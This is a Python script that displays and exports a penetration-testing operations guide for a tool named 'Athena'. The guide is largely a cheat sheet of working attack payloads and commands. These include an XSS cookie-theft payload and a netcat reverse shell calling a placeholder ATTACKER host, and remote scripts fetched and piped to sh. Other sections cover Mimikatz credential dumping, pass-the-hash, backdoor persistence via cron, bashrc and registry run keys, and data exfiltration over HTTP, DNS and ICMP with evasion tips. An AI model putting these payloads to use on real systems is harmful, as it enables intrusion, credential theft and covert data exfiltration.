import json
import os
import shutil
from typing import Dict, List, Optional


INDUSTRY_STANDARDS = {
    'PTES': 'http://www.pentest-standard.org/',
    'OWASP': 'https://owasp.org/www-project-web-security-testing-guide/',
    'NIST SP 800-115': 'https://csrc.nist.gov/publications/detail/sp/800-115/final',
    'OSSTMM': 'https://www.isecom.org/OSSTMM.3.pdf',
    'MITRE ATT&CK': 'https://attack.mitre.org/',
}

GUIDE_SECTIONS = {
    '0': {
        'title': 'Overview: Athena Attack Lifecycle',
        'content': """
ATIENA PENETRATION TEST METHODOLOGY
====================================
Reference: PTES (Penetration Testing Execution Standard) v3.1

PHASE 0: PRE-ENGAGEMENT
  - Scope agreement, RoE (Rules of Engagement), NDA signed
  - Emergency contact / stop-button identified
  - Testing window, IP whitelisting, WAF exception requests

PHASE 1: RECONNAISSANCE             ← Athena Mode 1 / Mode 2
  - Passive OSINT (Shodan, Censys, Google Dorking, DNS Dumpster)
  - Active scanning (Athena Discovery Module)
  - Technology fingerprinting, subdomain enumeration, port scanning

PHASE 2: VULNERABILITY SCANNING     ← Athena Mode 1 / Mode 3
  - Automated scanning (Athena Vulnerability Scanner)
  - Manual verification of findings
  - WAF detection and bypass profiling

PHASE 3: EXPLOITATION               ← Manual / Athena Exploitation Module
  - Weaponize findings from Phase 2
  - Gain initial foothold
  - Document all successful exploits with timestamps

PHASE 4: POST-EXPLOITATION          ← Manual (guide below)
  - Privilege escalation
  - Lateral movement
  - Persistence mechanisms
  - Data exfiltration (simulated)

PHASE 5: REPORTING                  ← Athena Report Generator
  - Executive summary (non-technical)
  - Technical findings with CVSS 3.1 scoring
  - Remediation roadmap
  - Evidence archive (screenshots, PCAPs, logs)
"""
    },
    '1': {
        'title': 'Phase 1: Reconnaissance — Methods & Tools',
        'content': """
1.1 PASSIVE OSINT
------------------
  Tool           Purpose                          Command / Method
  ─────          ───────                          ─────────────────
  Shodan         Internet-connected device search  shodan search hostname:TARGET
  Censys         Certificate transparency / TLS   censys search "TARGET"
  theHarvester   Email / subdomain enumeration    theHarvester -d TARGET -b all
  Google Dorks   Sensitive indexed data           site:TARGET filetype:pdf OR inurl:admin
  DNS Dumpster   Passive DNS mapping              https://dnsdumpster.com/
  Wayback Machine Historical crawl data           curl -s "http://web.archive.org/cdx/search/cdx?url=*.TARGET/*&output=text"
  amass          Subdomain enumeration (passive)  amass enum -passive -d TARGET
  subfinder      Fast subdomain discovery         subfinder -d TARGET
  Whois          Domain registration info         whois TARGET
  Netcraft       Web server / hosting info        https://searchdns.netcraft.com/

1.2 ACTIVE RECON (Athena)
--------------------------
  Athena Discovery Module:
    python athena.py https://TARGET 2

  This runs:
  - URL crawling & recursive discovery
  - Subdomain brute-force (500+ common subdomains)
  - TCP port scan (top 700+ ports)
  - Technology detection (headers, cookies, content, JS libs)
  - DNS record analysis (MX, TXT/SPF, DKIM, DMARC, NS)
  - TLS certificate inspection (expiry, SANs, weak ciphers)
  - Directory enumeration (admin, API, .git, .env)
  - Security endpoint discovery (.well-known, robots.txt)
  - Secret leakage detection (keys, tokens, credentials in source)

1.3 COMPLEMENTARY ACTIVE TOOLS
-------------------------------
  Tool           Purpose                         Command
  ────           ───────                         ───────
  nmap           Full port & service scan        nmap -sC -sV -p- -T4 TARGET -oA nmap_scan
  masscan        High-speed port discovery       masscan -p1-65535 --rate=10000 TARGET
  ffuf           Content discovery               ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt
  gobuster       Directory / DNS enumeration     gobuster dir -u https://TARGET -w wordlist.txt
  nuclei         Template-based vulnerability     nuclei -u https://TARGET -t ~/nuclei-templates/
  wappalyzer     Browser tech fingerprinting     (browser extension)
  WhatWeb        Command-line tech detection     whatweb https://TARGET -v
  wafw00f        WAF fingerprinting              wafw00f https://TARGET
"""
    },
    '2': {
        'title': 'Phase 2: Vulnerability Assessment — Methods & Tools',
        'content': """
2.1 ATHENA AUTOMATED SCAN
---------------------------
  python athena.py https://TARGET 3         (scan only)
  python athena.py https://TARGET 1         (full test)

  Checks performed:
  - CORS misconfiguration
  - CSRF (forms without tokens)
  - SQL injection (error-based, time-based, union-based)
  - XSS (reflected, stored detection via payload reflection)
  - Command injection (time-based, output-based)
  - Local File Inclusion / Path traversal
  - SSRF (cloud metadata, localhost probes)
  - SSTI (Jinja2, Twig, Freemarker, Velocity, Mako, Django)
  - NoSQL injection (MongoDB $gt, $ne, $where)
  - LDAP / XPath injection
  - Open redirect
  - CRLF injection / HTTP response splitting
  - Host header injection
  - HTTP method fuzzing (PUT, DELETE, TRACE, CONNECT)
  - Cache poisoning (X-Forwarded-Host, X-Original-URL)
  - Prototype pollution (client-side library detection)
  - GraphQL introspection
  - JWT token exposure in source / cookies / headers
  - Cookie security (Secure, HttpOnly, SameSite flags)
  - Subdomain takeover (CNAME to unclaimed services)
  - phpinfo() exposure
  - Directory listing
  - Sensitive file exposure (.git, .env, config files)
  - Server version disclosure
  - API IDOR (basic sequential ID testing)
  - Race conditions (concurrent request testing)
  - Parameter pollution
  - HTTP request smuggling (basic CL.TE)

2.2 COMPLEMENTARY VULNERABILITY SCANNERS
-----------------------------------------
  Tool           Purpose                         Command
  ────           ───────                         ───────
  Nmap NSE       Service vulnerability scripts   nmap -sV --script=vuln TARGET -oA vulnscan
  Nuclei         Community template scanner       nuclei -u https://TARGET -severity critical,high
  Nikto          Web server scanner               nikto -h https://TARGET
  OpenVAS / GVM  Full-suite vulnerability scan    gvm-cli --host TARGET --port 9390 ...
  Burp Scanner   DAST + manual testing            (Burp Suite Professional)
  Acunetix       Web application scanner          (commercial)
  WPScan         WordPress vulnerability scan     wpscan --url https://TARGET/api?rest_route=/
  droopescan     Drupal / Joomla / SilverStripe  droopescan scan drupal -u https://TARGET

2.3 CVSS 3.1 SEVERITY BENCHMARKS
---------------------------------
  Severity        Score Range
  ────────        ───────────
  NONE            0.0
  LOW             0.1 - 3.9
  MEDIUM          4.0 - 6.9
  HIGH            7.0 - 8.9
  CRITICAL        9.0 - 10.0
"""
    },
    '3': {
        'title': 'Phase 3: Exploitation — Methods & Tools Per Vulnerability',
        'content': """
3.1 SQL INJECTION
------------------
  Tool:      sqlmap, SQLNinja, jSQL, Burp Intruder
  Method:    sqlmap -u "URL?param=1" --dbs --batch --random-agent --tamper=space2comment
  Verify:    Look for UNION-based reflection, time delays (SLEEP(5)), error messages
  Escalate:  --os-shell (MySQL/MSSQL), --file-write (webshell deployment)

  Blind SQLi:    sqlmap -u "URL" --technique=T --time-sec=2 --dbs
  Error-based:   sqlmap -u "URL" --technique=E --dbs
  Stacked:       sqlmap -u "URL" --technique=S --dbs
  WAF Bypass:    --tamper=space2comment,between,randomcase,charencode

3.2 CROSS-SITE SCRIPTING (XSS)
-------------------------------
  Tool:      BeEF, XSS Hunter, Netcat, Burp Repeater
  Payload:   <script>fetch('http://ATTACKER:8080/?c='+document.cookie)</script>
  Verify:    Callback received on ncat listener
  Escalate:  Session hijacking, keylogging, CSRF token theft, BeEF hook

  Stored XSS:    Check comment forms, profile fields, support tickets
  DOM XSS:       Check JS that reads location.hash, location.search, document.referrer
  WAF Bypass:    <img src=x onerror="fetch('http://IP:8080/?c='+document.cookie)">
  Blind XSS:     XSS Hunter (xsshunter.com) or custom callback endpoint

3.3 COMMAND INJECTION / RCE
----------------------------
  Tool:      Netcat (ncat), Metasploit, Python, PowerShell
  Payload:   ; ncat ATTACKER_IP 4444 -e /bin/sh
  Verify:    Reverse shell callback received
  Escalate:  LinPEAS / WinPEAS, kernel exploit suggester

  Blind:         ; sleep 5 ;      (time-based verification)
  Out-of-band:   | nslookup ATTACKER_IP   (DNS callback)
  Output-based:  ; id ; whoami ; uname -a

3.4 LOCAL FILE INCLUSION (LFI)
-------------------------------
  Tool:      Curl, Burp, FFuF
  Payload:   ../../../../etc/passwd
  Verify:    root:x:0:0:root:/root:/bin/bash in response

  PHP Wrapper:   php://filter/convert.base64-encode/resource=config.php
  Log Poison:    Inject PHP code into User-Agent -> include(/var/log/apache2/access.log)
  Proc Env:      /proc/self/environ
  SSH Log:       /var/log/auth.log (inject via SSH username)

3.5 SERVER-SIDE REQUEST FORGERY (SSRF)
---------------------------------------
  Tool:      SSRFmap, Curl, Burp Repeater
  Payload:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
  Verify:    AWS IAM role credentials returned
  Escalate:  Extract cloud keys -> access S3 buckets, databases

  GCP:           http://metadata.google.internal/computeMetadata/v1/
  Azure:         http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Alibaba:       http://100.100.100.200/latest/meta-data/
  Internal:      http://localhost:9200 (Elasticsearch), :6379 (Redis), :3306 (MySQL)

3.6 SERVER-SIDE TEMPLATE INJECTION (SSTI)
------------------------------------------
  Tool:      Curl, Burp, tplmap
  Payload:   {{7*7}} -> 49 (Jinja2/Twig)
  Detect:    ${7*7} (Freemarker), ${{7*7}} (Velocity), #{7*7} (Ruby)

  tplmap:      tplmap -u "URL?param=1" --os-shell
  Jinja2 RCE:  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

3.7 INSECURE DIRECT OBJECT REFERENCE (IDOR)
--------------------------------------------
  Tool:      Curl, Burp Intruder, ffuf, jq
  Payload:   /api/users/1 -> /api/users/2, /api/users/3...
  Verify:    Different user data returned without auth
  Escalate:  Sequential IDs, UUIDs (test predictability), GUIDs (check leaks)

  Command:   for i in $(seq 1 500); do curl -s "https://TARGET/api/users/$i" | jq '.email'; done

3.8 API / GRAPHQL ATTACKS
--------------------------
  Tool:      Curl, Burp, graphqlmap, InQL
  Method:    Introspection query to dump schema
  Escalate:  Query for all users, mutations for privilege escalation

  GraphQL introspection:
    curl -X POST https://TARGET/graphql -H "Content-Type: application/json" \
      -d '{"query":"{__schema{types{name,fields{name}}}}"}'

  GraphQL batching (rate limit bypass):
    curl -X POST https://TARGET/graphql -H "Content-Type: application/json" \
      -d '{"query":"query{user(id:1){...} ... user(id:1000){...}}"}'

3.9 AUTHENTICATION BYPASS
--------------------------
  Tool:      Curl, Burp, Hydra, JWT_Tool
  Methods:
    - SQLi auth bypass: admin' OR '1'='1' --
    - JWT none attack:  {"alg":"none","typ":"JWT"} + {"sub":"admin","admin":true}
    - Session prediction: Burp Sequencer
    - 2FA bypass:        Reuse old JWT, OAuth CSRF, API calls without MFA check

  jwt_tool:  python3 jwt_tool.py TOKEN -T -I -S hs256 -k "secret"

3.10 SUBDOMAIN TAKEOVER
------------------------
  Tool:      Curl, dig, nuclei, subjack
  Method:    dig CNAME unclaimed-domain.com -> check if service is live
  Verify:    404/NXDOMAIN on the CNAME target = vulnerable
  Exploit:   Claim the service (AWS S3, Azure, Heroku, GitHub Pages)

  nuclei:       nuclei -t ~/nuclei-templates/takeovers/ -l subdomains.txt
  subjack:      subjack -w subdomains.txt -t 50 -ssl -v
"""
    },
    '4': {
        'title': 'Phase 4: Post-Exploitation — Privilege Escalation & Lateral Movement',
        'content': """
4.1 PRIVILEGE ESCALATION — LINUX
----------------------------------
  Tool           Purpose                         Command
  ────           ───────                         ───────
  LinPEAS        Automated privilege escalation   wget http://ATTACKER/linpeas.sh | sh
  linux-exploit- Kernel exploit suggester         wget http://ATTACKER/les.sh | sh
    suggester
  pspy           Process monitor (no root req)    ./pspy64 -i 1
  chisel         Tunnel / pivot tool              ./chisel client ATTACKER:8000 R:8888:socks

  Manual Checks (always run these first):
    sudo -l                                   # Check sudo permissions
    find / -perm -4000 -type f 2>/dev/null    # SUID binaries
    find / -perm -2000 -type f 2>/dev/null    # SGID binaries  
    cat /etc/crontab; ls -la /etc/cron*        # Cron jobs
    ls -la /home/*/.ssh/                       # SSH keys
    cat /etc/shadow | grep -v ':*:' | grep -v ':!'   # Password hashes
    docker ps 2>/dev/null                      # Docker breakout
    cat /var/spool/mail/root                   # Mail spool
    env | grep -i 'key\\|secret\\|password\\|token'   # Environment secrets

  Kernel Exploits:
    dirtypipe (CVE-2022-0847):  Linux 5.8 - 5.16
    pwnkit   (CVE-2021-4034):  pkexec (all versions)
    dirtycow (CVE-2016-5195):  Linux 2.6.22+ 

4.2 PRIVILEGE ESCALATION — WINDOWS
------------------------------------
  Tool           Purpose                         Command
  ────           ───────                         ───────
  WinPEAS        Automated privilege escalation   .\\WinPEASx64.exe
  Seatbelt       Security configuration audit     .\\Seatbelt.exe -group=all
  PowerUp        Privilege escalation checks      Import-Module PowerUp.ps1; Invoke-AllChecks
  Mimikatz       Credential dumping               mimikatz "privilege::debug" "sekurlsa::logonpasswords"
  Rubeus         Kerberos abuse                   .\\Rubeus.exe kerberoast
  SharpHound     BloodHound collector             .\\SharpHound.exe -c All

  Manual Checks:
    whoami /all                                  # Current user privileges
    systeminfo                                   # OS version & patches
    net localgroup Administrators                # Admin group members
    Get-ChildItem -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  # Autoruns
    Get-PSReadlineOption | Select HistorySavePath  # PowerShell history
    reg query HKLM /f password /t REG_SZ /s      # Registry passwords
    cmd.exe /c "dir /s *pass* == *.config == *.cred"  # File search

  Common Escalation Vectors:
    AlwaysInstallElevated:    reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer
    Unquoted Service Paths:   wmic service get name,pathname | findstr /i /v "C:\\Windows"
    Token Impersonation:      RogueWinRM / Hot Potato / Juicy Potato

4.3 LATERAL MOVEMENT
---------------------
  Method           Tool              Command
  ──────           ────              ───────
  Pass-the-Hash    impacket-wmiexec  wmiexec.py DOMAIN/admin@TARGET -hashes LM:NTLM
  Pass-the-Ticket  mimikatz          kerberos::ptt TICKET.kirbi
  Overpass-the-Hash                  Rubeus.exe asktgt /user:admin /rc4:HASH /ptt
  SSH key pivot    Native            ssh -i stolen_key user@internal-host
  PSRemoting       PowerShell        Enter-PSSession -ComputerName TARGET -Credential $cred
  SMB exec         impacket-smbexec  smbexec.py DOMAIN/user@TARGET
  Psexec           Sysinternals      psexec \\\\TARGET -u DOMAIN\\user -p pass cmd

4.4 TUNNELING & PIVOTING
--------------------------
  Tool        Purpose                  Command
  ────        ───────                  ───────
  chisel      SOCKS5 tunnel            attacker: ./chisel server -p 8000 --reverse
                                       victim:   ./chisel client ATTACKER:8000 R:8888:socks
  ssh -L/-D   Port / SOCKS forwarding  ssh -D 1080 -fN user@TARGET
  ssh -R      Reverse port forwarding  ssh -R 8080:localhost:80 user@ATTACKER
  proxychains Route tools through proxy proxychains4 nmap -sT -Pn 10.0.0.0/24
  ligolo-ng   Advanced tunelling       ./proxy -lport 8000; ./agent -connect ATTACKER:8000
"""
    },
    '5': {
        'title': 'Phase 5: Persistence & Data Exfiltration',
        'content': """
5.1 PERSISTENCE — LINUX
-------------------------
  Method                        Command
  ──────                        ───────
  SSH authorized_key            echo "ATTACKER_PUB_KEY" >> ~/.ssh/authorized_keys
  Cron job                      (crontab -l 2>/dev/null; echo "*/5 * * * * /path/to/payload") | crontab -
  systemd service               Create /etc/systemd/system/update.service with ExecStart=/path/to/payload
  .bashrc / .profile            echo "ncat ATTACKER_IP 4444 -e /bin/bash &" >> ~/.bashrc
  LD_PRELOAD / LD_LIBRARY_PATH  Compile malicious .so, export LD_PRELOAD=/tmp/malicious.so
  Kernel module                 insmod rootkit.ko (requires root)
  Docker host breakout          Mount host filesystem: docker run -v /:/mnt -it alpine

5.2 PERSISTENCE — WINDOWS
---------------------------
  Method                        Command
  ──────                        ───────
  Scheduled task                schtasks /create /tn "Updater" /tr "powershell -c PAYLOAD" /sc minute /mo 5
  Registry Run Key              reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "PAYLOAD"
  Startup folder                copy payload.exe "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
  WMI Event Subscription        New-WmiEvent -Trigger PAYLOAD
  Service creation              sc create Backdoor binPath= "PAYLOAD" start= auto
  DLL hijacking                 Replace missing DLL in application directory
  Silver / Golden Ticket        mimikatz "kerberos::golden /admin:admin /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /id:500"

5.3 DATA EXFILTRATION
-----------------------
  Method                        Command
  ──────                        ───────
  HTTP POST                     curl -X POST -d @sensitive_data.txt http://ATTACKER:8080/exfil
  DNS exfil                     while read line; do host $line.TARGET.ATTACKER; done < data.txt
  ICMP exfil                    cat data.txt | xxd -p -c 64 | while read line; do ping -c 1 -p $line ATTACKER_IP; done
  SMB share                     copy data.txt \\\\ATTACKER\\share\\
  Base64 + DNS                  for chunk in $(base64 -w 32 data.txt); do dig $chunk.exfil.ATTACKER; done
  Encrypted tunnel              ncat --ssl ATTACKER_IP 4444 < sensitive_data.zip
  Steganography (image)         steghide embed -cf image.jpg -ef secret.txt -p passphrase

  Exfiltration Detection Evasion:
    - Split data into small chunks (< 1KB)
    - Use standard protocols (HTTPS, DNS)
    - Encrypt before exfiltrating
    - Use timing delays between chunks
    - Blend into normal traffic patterns
    - Use social media / cloud storage as C2
"""
    },
    '6': {
        'title': 'Phase 6: Reporting & Remediation — Industry Standards',
        'content': """
6.1 REPORT STRUCTURE (PTES / CREST COMPLIANT)
-----------------------------------------------
  A professional penetration test report must include:

  1. EXECUTIVE SUMMARY (1-2 pages, non-technical)
     - Business impact overview
     - Key risk indicators (total findings by severity)
     - Strategic recommendations
     - Compensating controls already in place

  2. TECHNICAL FINDINGS (detailed per vulnerability)
     - Vulnerability name & CVE/CWE reference
     - CVSS 3.1 vector string & score
     - Affected host / URL / parameter
     - Proof of concept (screenshot, request/response, command output)
     - Remediation steps (specific, actionable)
     - References (OWASP, MITRE ATT&CK, vendor links)

  3. METHODOLOGY
     - Tools used (with versions)
     - Scan scope & limitations
     - Testing dates & duration

  4. REMEDIATION ROADMAP
     - Priority order (Critical -> Low)
     - Effort estimate per fix
     - Re-test recommendation window

  5. APPENDICES
     - Raw tool output
     - PCAP samples
     - Complete URL list scanned
     - Glossary of terms

6.2 REMEDIATION PRIORITY FRAMEWORK
------------------------------------
  Priority    Criteria                                    Timeline
  ────────    ────────                                    ────────
  CRITICAL    Direct RCE, credential leak, auth bypass    < 24 hours
  HIGH        SQLi, XSS, SSRF, IDOR, privilege esc.       < 72 hours
  MEDIUM      Misconfigurations, missing headers, info    1-2 weeks
              disclosure, outdated software
  LOW         Software version disclosed, cookie flags    1-4 weeks
  INFO        Best-practice recommendations               Next sprint

6.3 CVSS 3.1 SCORING QUICK REFERENCE
--------------------------------------
  Metric                    Values
  ──────                    ──────
  AV (Attack Vector)        N / A / L / P
  AC (Attack Complexity)    L / H
  PR (Privileges Required)  N / L / H
  UI (User Interaction)     N / R
  S (Scope)                 U / C
  C (Confidentiality)       H / L / N
  I (Integrity)             H / L / N
  A (Availability)          H / L / N

  Calculate: https://www.first.org/cvss/calculator/3.1

6.4 COMPLIANCE FRAMEWORKS REFERENCED
--------------------------------------
  Framework     Focus Area
  ─────────     ──────────
  PCI DSS v4.0  Cardholder data, Req 6.6 (web app security), Req 10 (audit logging)
  HIPAA         Healthcare PHI, administrative/physical/technical safeguards
  GDPR          EU data protection, Data Protection Impact Assessments (DPIA)
  ISO 27001     ISMS, Annex A controls (A.12.6.1 vulnerability management)
  NIST 800-53   Security controls, RA-5 (vulnerability scanning), SI-2 (flaw remediation)
  SOC 2         Service org controls, CC6 (logical/phys access), CC7 (monitoring)
"""
    },
    '7': {
        'title': 'Appendix: Tool Quick Reference & Cheat Sheet',
        'content': """
7.1 NETWORK / INFRASTRUCTURE
------------------------------
  nmap -sC -sV -p- TARGET         # Full port + version + default scripts
  masscan -p1-65535 TARGET         # High-speed port scan
  nc -nvlp 4444                    # Listener for reverse shells
  nc -nv TARGET 80                 # Banner grab
  curl -sI https://TARGET          # HTTP header analysis
  wget -r -np -R "index.html*" TARGET  # Mirror site
  openssl s_client -connect TARGET:443  # TLS inspection

7.2 WEB APPLICATION
---------------------
  sqlmap -u "URL?param=1" --batch --dbs
  ffuf -u https://TARGET/FUZZ -w wordlist.txt -ac
  gobuster dir -u https://TARGET -w wordlist.txt
  nuclei -u https://TARGET -t ~/nuclei-templates/ -severity critical,high,medium
  nikto -h https://TARGET
  wpscan --url https://TARGET --api-token TOKEN
  whatweb -v https://TARGET
  wafw00f https://TARGET

7.3 CREDENTIALS / AUTHENTICATION
----------------------------------
  hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
  jwt_tool TOKEN -T -I -S hs256 -k "secret"
  python3 jwt_tool.py TOKEN -T -I -S hs256 -k "secret"

7.4 POST-EXPLOITATION
-----------------------
  LinPEAS:       wget http://ATTACKER/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
  WinPEAS:       .\\winPEASx64.exe
  Mimikatz:      mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  BloodHound:    .\\SharpHound.exe -c All; upload to BloodHound UI
  Chisel:        attacker: ./chisel server -p 8000 --reverse; victim: ./chisel client ATTACKER:8000 R:1080:socks
  Impacket:      impacket-wmiexec DOMAIN/user@TARGET -hashes LM:NTLM
  pspy:          ./pspy64 -i 1
  CrackMapExec:  crackmapexec smb TARGET -u user -H HASH --shares
  Metasploit:    msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER; run"

7.5 WIRESHARK / PCAP ANALYSIS
-------------------------------
  Capture:       sudo tcpdump -i eth0 -w capture.pcap
  Filter HTTP:   http.request
  Filter DNS:    dns.qry.name contains TARGET
  Filter IP:     ip.addr == TARGET
  Extract files: File > Export Objects > HTTP
  Follow stream: Right-click > Follow > TCP/UDP/HTTP Stream
  Statistics:    Statistics > Endpoints > IPv4 (to see all hosts communicating)
  IO Graph:      Statistics > IO Graph (traffic patterns over time)
  Expert Info:   Analyze > Expert Info (automatic anomaly detection)

7.6 COMMON WORDLIST PATHS
---------------------------
  /usr/share/wordlists/rockyou.txt
  /usr/share/seclists/Discovery/Web-Content/common.txt
  /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
  /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
  /usr/share/nmap/scripts/vuln.nse

7.7 ATTACKER IP COMMANDS (NETCAT)
-----------------------------------
  Listen for shell:    ncat -lnvp 4444
  Listen with SSL:     ncat --ssl -lnvp 4444
  File transfer:       ncat -lnvp 8080 < file.exe
                       victim: ncat ATTACKER 8080 > file.exe
  Banner grab:         echo | ncat -w 3 TARGET PORT
  Port scan:           ncat -zv TARGET 1-1000
"""
}

}

def print_section(section_id: str, section: dict) -> None:
    width = shutil.get_terminal_size().columns
    print()
    print('=' * min(width, 78))
    print(f"  [{section_id}] {section['title']}")
    print('=' * min(width, 78))
    print(section['content'].strip())
    print()


def show_guide(section: Optional[str] = None) -> None:
    """Display the operations guide. If section is None, show menu."""
    if section and section in GUIDE_SECTIONS:
        print_section(section, GUIDE_SECTIONS[section])
        return

    while True:
        print()
        print('=' * 60)
        print('  ATIENA PENETRATION TEST OPERATIONS GUIDE')
        print('  Reference: PTES, OWASP, NIST SP 800-115, MITRE ATT&CK')
        print('=' * 60)
        print()
        for sid, sec in GUIDE_SECTIONS.items():
            print(f'  [{sid}] {sec["title"]}')
        print()
        print('  [a] Print ALL sections')
        print('  [q] Quit')
        print()

        choice = input('  Select section: ').strip().lower()
        if choice == 'q':
            break
        if choice == 'a':
            for sid, sec in GUIDE_SECTIONS.items():
                print_section(sid, sec)
            continue
        if choice in GUIDE_SECTIONS:
            print_section(choice, GUIDE_SECTIONS[choice])
            continue

        print(f'\n  [!] Invalid choice: {choice}')


def generate_guide_json(output_file: str = 'athena_operations_guide.json') -> str:
    """Export the full guide as a JSON file."""
    data = {
        'framework': 'Athena Penetration Test Operations Guide',
        'standards': INDUSTRY_STANDARDS,
        'sections': {
            sec['title']: sec['content'].strip()
            for sec in GUIDE_SECTIONS.values()
        }
    }
    with open(output_file, 'w') as f:
        json.dump(data, f, indent=2)
    return output_file


def main():
    import sys
    if len(sys.argv) > 1:
        if sys.argv[1] == '--json':
            path = generate_guide_json()
            print(f'Guide exported to {path}')
            return
        if sys.argv[1] in GUIDE_SECTIONS:
            show_guide(sys.argv[1])
            return
    show_guide()


if __name__ == '__main__':
    main()
